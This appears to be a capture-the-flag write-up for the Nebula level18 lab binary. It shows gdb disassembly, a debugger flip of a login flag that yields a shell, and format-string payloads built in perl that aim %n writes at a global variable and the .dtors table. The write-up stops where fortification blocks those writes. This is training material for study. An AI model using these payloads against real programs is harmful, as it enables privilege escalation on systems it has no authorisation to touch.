Step 1
-----------------------------
Modify the value of globals.loggedin from debugger, and test shell execution.
(Shell will be started under level18 uid)

level18@nebula:~$ gdb /home/flag18/flag18
(gdb) set disassembly-flavor intel
(gdb) disas login
Dump of assembler code for function login:
   0x08048c50 <+0>:     sub    esp,0x6c
   0x08048c53 <+3>:     mov    DWORD PTR [esp+0x60],ebx
   0x08048c57 <+7>:     mov    DWORD PTR [esp+0x68],edi
   0x08048c5b <+11>:    mov    edi,DWORD PTR [esp+0x70]
   0x08048c5f <+15>:    mov    eax,gs:0x14
   0x08048c65 <+21>:    mov    DWORD PTR [esp+0x5c],eax
   0x08048c69 <+25>:    xor    eax,eax
   0x08048c6b <+27>:    mov    DWORD PTR [esp+0x64],esi 
   0x08048c6f <+31>:    mov    DWORD PTR [esp+0x4],0x8048fba // mode, "r"
   0x08048c77 <+39>:    mov    DWORD PTR [esp],0x8048ef0 // path
   0x08048c7e <+46>:    call   0x8048750 <fopen@plt>
   0x08048c83 <+51>:    test   eax,eax
   0x08048c85 <+53>:    mov    ebx,eax
   0x08048c87 <+55>:    je     0x8048cb5 <login+101>
   0x08048c89 <+57>:    lea    esi,[esp+0x1c]
   0x08048c8d <+61>:    mov    DWORD PTR [esp+0x8],eax
   0x08048c91 <+65>:    mov    DWORD PTR [esp+0x4],0x3f
   0x08048c99 <+73>:    mov    DWORD PTR [esp],esi
   0x08048c9c <+76>:    call   0x8048670 <fgets@plt>
   0x08048ca1 <+81>:    test   eax,eax
   0x08048ca3 <+83>:    je     0x8048d18 <login+200>
   0x08048ca5 <+85>:    mov    DWORD PTR [esp+0x4],esi
---Type <return> to continue, or q <return> to quit---
   0x08048ca9 <+89>:    mov    DWORD PTR [esp],edi
   0x08048cac <+92>:    call   0x8048640 <strcmp@plt>
   0x08048cb1 <+97>:    test   eax,eax
   0x08048cb3 <+99>:    jne    0x8048cf4 <login+164>
   0x08048cb5 <+101>:   mov    edx,DWORD PTR ds:0x804b0ac
   0x08048cbb <+107>:   test   edx,edx
   0x08048cbd <+109>:   je     0x8048cea <login+154>
   0x08048cbf <+111>:   mov    eax,0x8048f50
   0x08048cc4 <+116>:   test   ebx,ebx
   0x08048cc6 <+118>:   mov    ecx,0x8048fa0
   0x08048ccb <+123>:   cmovne eax,ecx
   0x08048cce <+126>:   mov    DWORD PTR [esp+0xc],eax
   0x08048cd2 <+130>:   mov    DWORD PTR [esp+0x8],0x8048fe0
   0x08048cda <+138>:   mov    DWORD PTR [esp+0x4],0x1
   0x08048ce2 <+146>:   mov    DWORD PTR [esp],edx
   0x08048ce5 <+149>:   call   0x8048770 <__fprintf_chk@plt>
   0x08048cea <+154>:   mov    DWORD PTR ds:0x804b0b4,0x1
   0x08048cf4 <+164>:   mov    eax,DWORD PTR [esp+0x5c]
   0x08048cf8 <+168>:   xor    eax,DWORD PTR gs:0x14
   0x08048cff <+175>:   jne    0x8048d43 <login+243>
   0x08048d01 <+177>:   mov    ebx,DWORD PTR [esp+0x60]
   0x08048d05 <+181>:   mov    esi,DWORD PTR [esp+0x64]
   0x08048d09 <+185>:   mov    edi,DWORD PTR [esp+0x68]
---Type <return> to continue, or q <return> to quit---
   0x08048d0d <+189>:   add    esp,0x6c
   0x08048d10 <+192>:   ret
   0x08048d11 <+193>:   lea    esi,[esi+eiz*1+0x0]
   0x08048d18 <+200>:   mov    eax,ds:0x804b0ac
   0x08048d1d <+205>:   test   eax,eax
   0x08048d1f <+207>:   je     0x8048cf4 <login+164>
   0x08048d21 <+209>:   mov    DWORD PTR [esp+0xc],0x8048ef0
   0x08048d29 <+217>:   mov    DWORD PTR [esp+0x8],0x8048fbc
   0x08048d31 <+225>:   mov    DWORD PTR [esp+0x4],0x1
   0x08048d39 <+233>:   mov    DWORD PTR [esp],eax
   0x08048d3c <+236>:   call   0x8048770 <__fprintf_chk@plt>
   0x08048d41 <+241>:   jmp    0x8048cf4 <login+164>
   0x08048d43 <+243>:   call   0x8048690 <__stack_chk_fail@plt>
End of assembler dump.
(gdb) disas main
Dump of assembler code for function main:
   0x080487b0 <+0>:     push   ebp
   0x080487b1 <+1>:     mov    ebp,esp
   0x080487b3 <+3>:     push   edi
   0x080487b4 <+4>:     push   esi
   0x080487b5 <+5>:     push   ebx
   0x080487b6 <+6>:     and    esp,0xfffffff0
   0x080487b9 <+9>:     sub    esp,0x130
   0x080487bf <+15>:    mov    edx,DWORD PTR [ebp+0xc]
   0x080487c2 <+18>:    mov    eax,gs:0x14
   0x080487c8 <+24>:    mov    DWORD PTR [esp+0x12c],eax
   0x080487cf <+31>:    xor    eax,eax
   0x080487d1 <+33>:    mov    ebx,DWORD PTR [ebp+0x8]
   0x080487d4 <+36>:    mov    DWORD PTR [esp+0x1c],edx
   0x080487d8 <+40>:    mov    edx,DWORD PTR [ebp+0x10]
   0x080487db <+43>:    mov    DWORD PTR [esp+0x18],edx
   0x080487df <+47>:    nop
   0x080487e0 <+48>:    mov    edx,DWORD PTR [esp+0x1c]
   0x080487e4 <+52>:    mov    DWORD PTR [esp+0x8],0x8048f1b
   0x080487ec <+60>:    mov    DWORD PTR [esp],ebx
   0x080487ef <+63>:    mov    DWORD PTR [esp+0x4],edx
   0x080487f3 <+67>:    call   0x8048730 <getopt@plt>
   0x080487f8 <+72>:    cmp    al,0xff
---Type <return> to continue, or q <return> to quit---
   0x080487fa <+74>:    je     0x8048858 <main+168>
   0x080487fc <+76>:    cmp    al,0x64
   0x080487fe <+78>:    je     0x8048810 <main+96>
   0x08048800 <+80>:    cmp    al,0x76
   0x08048802 <+82>:    jne    0x80487e0 <main+48>
   0x08048804 <+84>:    add    DWORD PTR ds:0x804b0b0,0x1
   0x0804880b <+91>:    jmp    0x80487e0 <main+48>
   0x0804880d <+93>:    lea    esi,[esi+0x0]
   0x08048810 <+96>:    mov    eax,ds:0x804b0a0
   0x08048815 <+101>:   mov    DWORD PTR [esp+0x4],0x8048f06
   0x0804881d <+109>:   mov    DWORD PTR [esp],eax
   0x08048820 <+112>:   call   0x8048750 <fopen@plt>
   0x08048825 <+117>:   test   eax,eax
   0x08048827 <+119>:   mov    ds:0x804b0ac,eax
   0x0804882c <+124>:   je     0x8048aa8 <main+760>
   0x08048832 <+130>:   mov    DWORD PTR [esp+0xc],0x0
   0x0804883a <+138>:   mov    DWORD PTR [esp+0x8],0x2
   0x08048842 <+146>:   mov    DWORD PTR [esp+0x4],0x0
   0x0804884a <+154>:   mov    DWORD PTR [esp],eax
   0x0804884d <+157>:   call   0x8048740 <setvbuf@plt>
   0x08048852 <+162>:   jmp    0x80487e0 <main+48>
   0x08048854 <+164>:   lea    esi,[esi+eiz*1+0x0]
   0x08048858 <+168>:   mov    eax,ds:0x804b0ac
---Type <return> to continue, or q <return> to quit---
   0x0804885d <+173>:   test   eax,eax
   0x0804885f <+175>:   je     0x8048883 <main+211>
   0x08048861 <+177>:   mov    edx,DWORD PTR ds:0x804b0b0
   0x08048867 <+183>:   mov    DWORD PTR [esp+0x8],0x8049070
   0x0804886f <+191>:   mov    DWORD PTR [esp+0x4],0x1
   0x08048877 <+199>:   mov    DWORD PTR [esp],eax
   0x0804887a <+202>:   mov    DWORD PTR [esp+0xc],edx
   0x0804887e <+206>:   call   0x8048770 <__fprintf_chk@plt>
   0x08048883 <+211>:   call   0x80486c0 <getegid@plt>
   0x08048888 <+216>:   mov    esi,eax
   0x0804888a <+218>:   call   0x80486c0 <getegid@plt>
   0x0804888f <+223>:   mov    ebx,eax
   0x08048891 <+225>:   call   0x80486c0 <getegid@plt>
   0x08048896 <+230>:   mov    DWORD PTR [esp+0x8],esi
   0x0804889a <+234>:   mov    DWORD PTR [esp+0x4],ebx
   0x0804889e <+238>:   mov    DWORD PTR [esp],eax
   0x080488a1 <+241>:   call   0x8048780 <setresgid@plt>
   0x080488a6 <+246>:   call   0x80486a0 <geteuid@plt>
   0x080488ab <+251>:   mov    esi,eax
   0x080488ad <+253>:   call   0x80486a0 <geteuid@plt>
   0x080488b2 <+258>:   mov    ebx,eax
   0x080488b4 <+260>:   call   0x80486a0 <geteuid@plt>
   0x080488b9 <+265>:   mov    DWORD PTR [esp+0x4],ebx
---Type <return> to continue, or q <return> to quit---
   0x080488bd <+269>:   lea    ebx,[esp+0x2c]
   0x080488c1 <+273>:   mov    DWORD PTR [esp+0x8],esi
   0x080488c5 <+277>:   mov    DWORD PTR [esp],eax
   0x080488c8 <+280>:   call   0x8048650 <setresuid@plt>
   0x080488cd <+285>:   lea    esi,[esi+0x0]
   0x080488d0 <+288>:   mov    eax,ds:0x804b080
   0x080488d5 <+293>:   mov    DWORD PTR [esp+0x4],0xff
   0x080488dd <+301>:   mov    DWORD PTR [esp],ebx
   0x080488e0 <+304>:   mov    DWORD PTR [esp+0x8],eax
   0x080488e4 <+308>:   call   0x8048670 <fgets@plt>
   0x080488e9 <+313>:   test   eax,eax
   0x080488eb <+315>:   je     0x8048a88 <main+728>
   0x080488f1 <+321>:   mov    DWORD PTR [esp+0x4],0xa
   0x080488f9 <+329>:   mov    DWORD PTR [esp],ebx
   0x080488fc <+332>:   call   0x8048700 <strchr@plt>
   0x08048901 <+337>:   test   eax,eax
   0x08048903 <+339>:   je     0x8048908 <main+344>
   0x08048905 <+341>:   mov    BYTE PTR [eax],0x0
   0x08048908 <+344>:   mov    DWORD PTR [esp+0x4],0xd
   0x08048910 <+352>:   mov    DWORD PTR [esp],ebx
   0x08048913 <+355>:   call   0x8048700 <strchr@plt>
   0x08048918 <+360>:   test   eax,eax
   0x0804891a <+362>:   je     0x804891f <main+367>
---Type <return> to continue, or q <return> to quit---
   0x0804891c <+364>:   mov    BYTE PTR [eax],0x0
   0x0804891f <+367>:   mov    eax,ds:0x804b0ac
   0x08048924 <+372>:   test   eax,eax
   0x08048926 <+374>:   je     0x804894d <main+413>
   0x08048928 <+376>:   cmp    DWORD PTR ds:0x804b0b0,0x1
   0x0804892f <+383>:   jle    0x804894d <main+413>
   0x08048931 <+385>:   mov    DWORD PTR [esp+0xc],ebx
   0x08048935 <+389>:   mov    DWORD PTR [esp+0x8],0x8048f1f
   0x0804893d <+397>:   mov    DWORD PTR [esp+0x4],0x1
   0x08048945 <+405>:   mov    DWORD PTR [esp],eax
   0x08048948 <+408>:   call   0x8048770 <__fprintf_chk@plt>
   0x0804894d <+413>:   mov    edi,0x8048f32
   0x08048952 <+418>:   mov    ecx,0x5
   0x08048957 <+423>:   mov    esi,ebx
   0x08048959 <+425>:   repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   0x0804895b <+427>:   jne    0x8048988 <main+472>
   0x0804895d <+429>:   mov    eax,ds:0x804b0ac
   0x08048962 <+434>:   test   eax,eax
   0x08048964 <+436>:   je     0x8048973 <main+451>
   0x08048966 <+438>:   cmp    DWORD PTR ds:0x804b0b0,0x2
   0x0804896d <+445>:   jg     0x8048a60 <main+688>
   0x08048973 <+451>:   lea    eax,[esp+0x32]
   0x08048977 <+455>:   mov    DWORD PTR [esp],eax
---Type <return> to continue, or q <return> to quit---
   0x0804897a <+458>:   call   0x8048c50 <login>
   0x0804897f <+463>:   jmp    0x80488d0 <main+288>
   0x08048984 <+468>:   lea    esi,[esi+eiz*1+0x0]
   0x08048988 <+472>:   mov    eax,0x8048f4d
   0x0804898d <+477>:   mov    ecx,0x6
   0x08048992 <+482>:   mov    esi,ebx
   0x08048994 <+484>:   mov    edi,eax
   0x08048996 <+486>:   repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   0x08048998 <+488>:   je     0x8048a00 <main+592>
   0x0804899a <+490>:   mov    edi,0x8048f54   // compare input string with "shell"
   0x0804899f <+495>:   mov    ecx,0x5
   0x080489a4 <+500>:   mov    esi,ebx
   0x080489a6 <+502>:   repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   0x080489a8 <+504>:   jne    0x8048a10 <main+608>
   0x080489aa <+506>:   mov    eax,ds:0x804b0ac
   0x080489af <+511>:   test   eax,eax
   0x080489b1 <+513>:   je     0x80489c0 <main+528>
   0x080489b3 <+515>:   cmp    DWORD PTR ds:0x804b0b0,0x2
   0x080489ba <+522>:   jg     0x8048b55 <main+933>
   0x080489c0 <+528>:   mov    eax,ds:0x804b0b4   // load globals.loggedin
   0x080489c5 <+533>:   test   eax,eax
   0x080489c7 <+535>:   jne    0x8048b20 <main+880> // if globals.loggedin != 0
   0x080489cd <+541>:   mov    eax,ds:0x804b0ac
---Type <return> to continue, or q <return> to quit---
   0x080489d2 <+546>:   test   eax,eax
   0x080489d4 <+548>:   je     0x80488d0 <main+288>
   0x080489da <+554>:   mov    DWORD PTR [esp+0xc],eax
   0x080489de <+558>:   mov    DWORD PTR [esp+0x8],0x12
   0x080489e6 <+566>:   mov    DWORD PTR [esp+0x4],0x1
   0x080489ee <+574>:   mov    DWORD PTR [esp],0x8048f8e
   0x080489f5 <+581>:   call   0x80486d0 <fwrite@plt>
   0x080489fa <+586>:   jmp    0x80488d0 <main+288>
   0x080489ff <+591>:   nop
   0x08048a00 <+592>:   mov    DWORD PTR ds:0x804b0b4,0x0
   0x08048a0a <+602>:   jmp    0x80488d0 <main+288>
   0x08048a0f <+607>:   nop
   0x08048a10 <+608>:   mov    ecx,0x4
   0x08048a15 <+613>:   mov    esi,ebx
   0x08048a17 <+615>:   mov    edi,eax
   0x08048a19 <+617>:   repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   0x08048a1b <+619>:   je     0x8048a00 <main+592>
   0x08048a1d <+621>:   mov    DWORD PTR [esp+0x8],0x8
   0x08048a25 <+629>:   mov    DWORD PTR [esp+0x4],0x8048fa1
   0x08048a2d <+637>:   mov    DWORD PTR [esp],ebx
   0x08048a30 <+640>:   call   0x8048790 <strncmp@plt>
   0x08048a35 <+645>:   test   eax,eax
   0x08048a37 <+647>:   jne    0x8048acf <main+799>
---Type <return> to continue, or q <return> to quit---
   0x08048a3d <+653>:   mov    eax,ds:0x804b0ac
   0x08048a42 <+658>:   test   eax,eax
   0x08048a44 <+660>:   je     0x8048a4e <main+670>
   0x08048a46 <+662>:   mov    DWORD PTR [esp],eax
   0x08048a49 <+665>:   call   0x8048680 <fclose@plt>
   0x08048a4e <+670>:   mov    DWORD PTR ds:0x804b0ac,0x0
   0x08048a58 <+680>:   jmp    0x80488d0 <main+288>
   0x08048a5d <+685>:   lea    esi,[esi+0x0]
   0x08048a60 <+688>:   mov    DWORD PTR [esp+0xc],eax
   0x08048a64 <+692>:   mov    DWORD PTR [esp+0x8],0x14
   0x08048a6c <+700>:   mov    DWORD PTR [esp+0x4],0x1
   0x08048a74 <+708>:   mov    DWORD PTR [esp],0x8048f38
   0x08048a7b <+715>:   call   0x80486d0 <fwrite@plt>
   0x08048a80 <+720>:   jmp    0x8048973 <main+451>
   0x08048a85 <+725>:   lea    esi,[esi+0x0]
   0x08048a88 <+728>:   xor    eax,eax
   0x08048a8a <+730>:   mov    edx,DWORD PTR [esp+0x12c]
   0x08048a91 <+737>:   xor    edx,DWORD PTR gs:0x14
   0x08048a98 <+744>:   jne    0x8048b8b <main+987>
   0x08048a9e <+750>:   lea    esp,[ebp-0xc]
   0x08048aa1 <+753>:   pop    ebx
   0x08048aa2 <+754>:   pop    esi
   0x08048aa3 <+755>:   pop    edi
---Type <return> to continue, or q <return> to quit---
   0x08048aa4 <+756>:   pop    ebp
   0x08048aa5 <+757>:   ret
   0x08048aa6 <+758>:   xchg   ax,ax
   0x08048aa8 <+760>:   mov    eax,ds:0x804b0a0
   0x08048aad <+765>:   mov    DWORD PTR [esp+0x4],0x8048f09
   0x08048ab5 <+773>:   mov    DWORD PTR [esp],0x1
   0x08048abc <+780>:   mov    DWORD PTR [esp+0x8],eax
   0x08048ac0 <+784>:   call   0x80486b0 <err@plt>
   0x08048ac5 <+789>:   mov    eax,ds:0x804b0ac
   0x08048aca <+794>:   jmp    0x8048832 <main+130>
   0x08048acf <+799>:   mov    DWORD PTR [esp+0x8],0x9
   0x08048ad7 <+807>:   mov    DWORD PTR [esp+0x4],0x8048faa
   0x08048adf <+815>:   mov    DWORD PTR [esp],ebx
   0x08048ae2 <+818>:   call   0x8048790 <strncmp@plt>
   0x08048ae7 <+823>:   test   eax,eax
   0x08048ae9 <+825>:   je     0x8048b7a <main+970>
   0x08048aef <+831>:   mov    DWORD PTR [esp+0x8],0x7
   0x08048af7 <+839>:   mov    DWORD PTR [esp+0x4],0x8048fb4
   0x08048aff <+847>:   mov    DWORD PTR [esp],ebx
   0x08048b02 <+850>:   call   0x8048790 <strncmp@plt>
   0x08048b07 <+855>:   test   eax,eax
   0x08048b09 <+857>:   jne    0x80488d0 <main+288>
   0x08048b0f <+863>:   lea    edx,[esp+0x34]
---Type <return> to continue, or q <return> to quit---
   0x08048b13 <+867>:   mov    DWORD PTR [esp],edx
   0x08048b16 <+870>:   call   0x8048db0 <setuser>
   0x08048b1b <+875>:   jmp    0x80488d0 <main+288>
   0x08048b20 <+880>:   mov    edx,DWORD PTR [esp+0x18]
   0x08048b24 <+884>:   mov    DWORD PTR [esp],0x8048f75
   0x08048b2b <+891>:   mov    DWORD PTR [esp+0x8],edx
   0x08048b2f <+895>:   mov    edx,DWORD PTR [esp+0x1c]
   0x08048b33 <+899>:   mov    DWORD PTR [esp+0x4],edx
   0x08048b37 <+903>:   call   0x8048720 <execve@plt>  // call execve("/bin/sh")
   0x08048b3c <+908>:   mov    DWORD PTR [esp+0x4],0x8048f7d
   0x08048b44 <+916>:   mov    DWORD PTR [esp],0x1
   0x08048b4b <+923>:   call   0x80486b0 <err@plt>
   0x08048b50 <+928>:   jmp    0x80489cd <main+541>
   0x08048b55 <+933>:   mov    DWORD PTR [esp+0xc],eax
   0x08048b59 <+937>:   mov    DWORD PTR [esp+0x8],0x1a
   0x08048b61 <+945>:   mov    DWORD PTR [esp+0x4],0x1
   0x08048b69 <+953>:   mov    DWORD PTR [esp],0x8048f5a
   0x08048b70 <+960>:   call   0x80486d0 <fwrite@plt>
   0x08048b75 <+965>:   jmp    0x80489c0 <main+528>
   0x08048b7a <+970>:   lea    eax,[esp+0x36]
   0x08048b7e <+974>:   mov    DWORD PTR [esp],eax
   0x08048b81 <+977>:   call   0x8048d50 <notsupported>
   0x08048b86 <+982>:   jmp    0x80488d0 <main+288>
---Type <return> to continue, or q <return> to quit---
   0x08048b8b <+987>:   call   0x8048690 <__stack_chk_fail@plt>
End of assembler dump.
(gdb) x /s 0x8048f32
0x8048f32:       "login"
(gdb)  x /s 0x8048f54
0x8048f54:       "shell"
(gdb) b *0x080489c0
Breakpoint 1 at 0x80489c0
(gdb) run
Starting program: /home/flag18/flag18
shell

Breakpoint 1, 0x080489c0 in main ()
(gdb) disp /5i $pc
1: x/5i $pc
=> 0x80489c0 <main+528>:        mov    eax,ds:0x804b0b4
   0x80489c5 <main+533>:        test   eax,eax
   0x80489c7 <main+535>:        jne    0x8048b20 <main+880>
   0x80489cd <main+541>:        mov    eax,ds:0x804b0ac
   0x80489d2 <main+546>:        test   eax,eax
(gdb) x /d 0x804b0b4
0x804b0b4 <globals+8>:  0
(gdb) set {int}0x804b0b4 = 1
(gdb) x /d 0x804b0b4
0x804b0b4 <globals+8>:  1
(gdb) c
Continuing.
process 1839 is executing new program: /bin/bash
level18@nebula:~$ id
uid=1019(level18) gid=1019(level18) groups=1019(level18)

Step 1
-----------------------------
Modify the value of globals.loggedin by exploiting 'site exec'
format string vulnerability.

Find the offset on the stack which we control:

$ /home/flag18/flag18 -d /tmp/log -vvv
site exec ABCD%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x
^C
level18@nebula:~$ cat /tmp/log
Starting up. Verbose level = 3
got [site exec ABCD%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x] as input
ABCD08048f4e.bfd1be38.00656c30.097da0a0.097da1d8.08048f4d.00662918.bfd1bd1c.08048b86.bfd1bd26.08048faa.00000009.08x.bfd1bd1c.00000000.0065274d.bfd1bee8.bfd1bed4.009ccbe8.00000001.b77dcb18.65746973.65786520.42412063.30254443level18@nebula:~$

ABCD is 41424344 --> seen in the above output

"http://crypto.stanford.edu/cs155old/cs155-spring08/papers/formatstring-1.2.pdf"
Exploiting Format String Vulnerabilities - scut / team teso
"If we cannot reach the exact format string boundary by using 4-Byte
pops (‘%08x’), we have to pad the format string, by prepending one, two or
three junk characters. We can not move the stack pointer byte-wise, instead we move the format string itself,
so that it lies on a four-byte boundary to the stack pointer and we can reach it with a
multiple of four-byte pops"

level18@nebula:~$ /home/flag18/flag18 -d /tmp/log -vvv
site exec ABCDEF%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x
^C
level18@nebula:~$ cat /tmp/log
Starting up. Verbose level = 3
got [site exec ABCDEF%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x] as input
ABCDEF08048f4e.bfbc2938.00ef5c30.09ca90a0.09ca91d8.08048f4d.00f01918.bfbc281c.08048b86.bfbc2826.08048faa.00000009.bfbc281c.00000000.00ef174d.bfbc29e8.bfbc29d4.001d4be8.00000001.b7793b18.65746973.65786520.42412063.46454443

Now we've fund the offset which we control.
And the address we want to modify is 0x804b0b4.
Simplify things using perl:

level18@nebula:~$ echo site exec `perl -e 'print "AB"."\xb4\xb0\x04\x08"."%08x."x24'` | /home/flag18/flag18 -d /tmp/log -vvv
level18@nebula:~$ cat /tmp/log
Starting up. Verbose level = 3
got [site exec AB´%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.] as input
AB´08048f4e.bf8128c8.00abdc30.08f2d0a0.08f2d1d8.08048f4d.00ac9918.bf8127ac.08048b86.bf8127b6.08048faa.00000009.bf8127ac.00000000.00ab974d.bf812978.bf812964.00d9bbe8.00000001.b7851b18.65746973.65786520.42412063.0804b0b4.level18@nebula:~$

Write that address and verify:
 echo -e site exec `perl -e 'print "AB"."\xb4\xb0\x04\x08"."%08x."x23,"%n"'` "\nsite exec" `perl -e 'print "AB"."\xb4\xb0\x04\x08"."%08x."x24'` | /home/flag18/flag18 -d /tmp/log -vvv
*** %n in writable segment detected ***
Aborted

Another protection to bypass...

Overwrite destructors method
-------------
level18@nebula:~$ nm /home/flag18/flag18 | grep DTOR
0804af20 D __DTOR_END__
0804af1c d __DTOR_LIST__

level18@nebula:~$ objdump -s -j .dtors /home/flag18/flag18
/home/flag18/flag18:     file format elf32-i386

Contents of section .dtors:
 804af1c ffffffff 00000000                    ........
level18@nebula:~$
Destructor table is only 4 bytes long (only the terminator). 

Check if destructor table is writable:
level18@nebula:~$ objdump -h /home/flag18/flag18
/home/flag18/flag18:     file format elf32-i386
Sections:
[ . . . ]
18 .dtors        00000008  0804af1c  0804af1c  00001f1c  2**2
                  CONTENTS, ALLOC, LOAD, DATA
We see that is not marked READONLY, so it is readable.

Since the .dtors section is writable, if the address after the 0xffffffff is overwritten with a memory address, the program's execution flow will be directed to that address when the program exits. This will be the address of __DTOR_LIST__ plus four, which is 0x0804af20 (which also happens to be the address of __DTOR_END__ in this case).

Confirm by reading at the address of __DTOR_LIST__:
level18@nebula:~$ echo -e site exec `perl -e 'print "AB"."\x1c\xaf\x04\x08"."%08x."x23,"%s"'` | /home/flag18/flag18 -d /tmp/log -vvv
level18@nebula:~$ cat /tmp/log
Starting up. Verbose level = 3
got [site exec AB%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%s] as input
AB08048f4e.bfe95808.00fe1c30.087cd0a0.087cd1d8.08048f4d.00fed918.bfe956ec.08048b86.bfe956f6.08048faa.00000009.bfe956ec.00000000.00fdd74d.bfe958b8.bfe958a4.00b46be8.00000001.b782eb18.65746973.65786520.42412063.ÿÿÿÿlevel18@nebula:~$

The last 4 bytes printed are \xff\xff\xff\xff.

Try to overwrite it:
level18@nebula:~$ echo -e site exec `perl -e 'print "AB"."\x20\xaf\x04\x08"."%08x."x23,"%n"'` "\nsite exec" `perl -e 'print "AB"."\x20\xaf\x04\x08"."%08x."x24'` | /home/flag18/flag18 -d /tmp/log -vvv
*** %n in writable segment detected ***
Aborted
level18@nebula:~$


Still no luck this time..
Bypassing this: http://www.phrack.org/issues.html?issue=67&id=9
